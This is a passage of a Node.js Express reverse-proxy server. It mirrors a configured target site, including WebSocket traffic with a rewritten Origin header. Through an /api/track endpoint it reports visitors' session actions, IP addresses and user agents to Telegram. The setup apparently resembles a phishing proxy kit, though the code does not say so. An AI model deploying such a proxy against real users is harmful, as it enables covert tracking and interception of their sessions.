  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Test endpoint to check if server is responding
app.get('/test', (req, res) => {
  res.status(200).json({ 
    message: 'Server is working',
    target: config.target.url,
    timestamp: new Date().toISOString()
  });
});

// API endpoint for user tracking (Telegram notifications)
app.use(express.json({ limit: '1mb' }));
app.post('/api/track', async (req, res) => {
  try {
    const { sessionId, action } = req.body;
    
    if (!sessionId || !action) {
      return res.status(400).json({ error: 'Missing sessionId or action' });
    }
    
    // Get user metadata
    const meta = {
      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress,
      userAgent: req.headers['user-agent'],
    };
    
    // Track action
    await telegramLogger.trackAction(sessionId, action, meta);
    
    res.status(200).json({ ok: true });
  } catch (error) {
    logger.error('[Track API] Error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Apply proxy middleware to all routes
app.use('/', createProxyMiddleware(proxyOptions));

// WebSocket proxy
if (config.features.websocket) {
  app.ws('/*', (ws, req) => {
    logger.info(`WebSocket connection established: ${req.url}`);
    
    const WebSocket = require('ws');
    const targetUrl = config.target.url.replace('http', 'ws') + req.url;
    const proxyWs = new WebSocket(targetUrl, {
      headers: {
        'Origin': config.target.url,
        'User-Agent': req.headers['user-agent'],
      },
    });
    
    // Forward messages from client to target
    ws.on('message', (msg) => {
      if (proxyWs.readyState === WebSocket.OPEN) {
        proxyWs.send(msg);
      }
    });
    
    // Forward messages from target to client
    proxyWs.on('message', (msg) => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
      }
    });
    
    // Handle errors
    proxyWs.on('error', (err) => {
      logger.error('WebSocket proxy error', { error: err.message });
      ws.close();
    });
    
    ws.on('error', (err) => {
      logger.error('WebSocket client error', { error: err.message });
      proxyWs.close();
    });
    
    // Handle close
    proxyWs.on('close', () => {
      ws.close();
    });
    
    ws.on('close', () => {
      proxyWs.close();
    });
  });
}

// Global error handler
app.use((err, req, res, next) => {
  logger.error('Application error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
  });
  
  res.status(500).json({
    error: 'Internal Server Error',
    message: err.message,
  });
});

// Start server
const server = app.listen(config.server.port, config.server.host, () => {
  logger.info('='.repeat(60));
  logger.info('🚀 Reverse Proxy Server Started');
  logger.info('='.repeat(60));
  logger.info(`Target URL: ${config.target.url}`);
  logger.info(`Listening on: ${config.server.host}:${config.server.port}`);
  logger.info(`WebSocket: ${config.features.websocket ? 'Enabled' : 'Disabled'}`);
  logger.info(`Compression: ${config.features.compression ? 'Enabled' : 'Disabled'}`);
  logger.info(`Log Level: ${config.logging.level}`);
  logger.info(`Proxy Timeout: ${config.target.timeout}ms`);
  logger.info(`Request Timeout: ${config.target.timeout + 30000}ms`);
  if (config.proxy && config.proxy.enabled) {
    logger.info(`External Proxy: ${config.proxy.host}:${config.proxy.port} (ENABLED)`);
  } else {
    logger.info(`External Proxy: DISABLED`);
  }
  logger.info('='.repeat(60));
});

// Server timeout settings - MUST be greater than proxy timeout
// CRITICAL FIX: Dynamic timeouts based on PROXY_TIMEOUT config
const serverTimeout = config.target.timeout + 60000; // proxy timeout + 60s buffer
server.keepAliveTimeout = serverTimeout;
server.headersTimeout = serverTimeout + 1000; // must be > keepAliveTimeout
server.timeout = serverTimeout + 5000; // overall server timeout

logger.info(`Server timeouts configured: keepAlive=${serverTimeout}ms, headers=${serverTimeout + 1000}ms`);

// Monitor memory usage periodically
setInterval(() => {
  const memUsage = process.memoryUsage();
  const memUsageMB = {
    rss: Math.round(memUsage.rss / 1024 / 1024),
    heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024),
    heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024),
  };
  
  logger.info('Memory Usage', memUsageMB);
  
  // Warn if memory usage is high (>500MB RSS)
  if (memUsageMB.rss > 500) {
    logger.warn('High memory usage detected', memUsageMB);
  }
}, 300000); // Every 5 minutes

// Graceful shutdown
process.on('SIGTERM', () => {
  logger.info('SIGTERM signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  logger.info('SIGINT signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

module.exports = app;

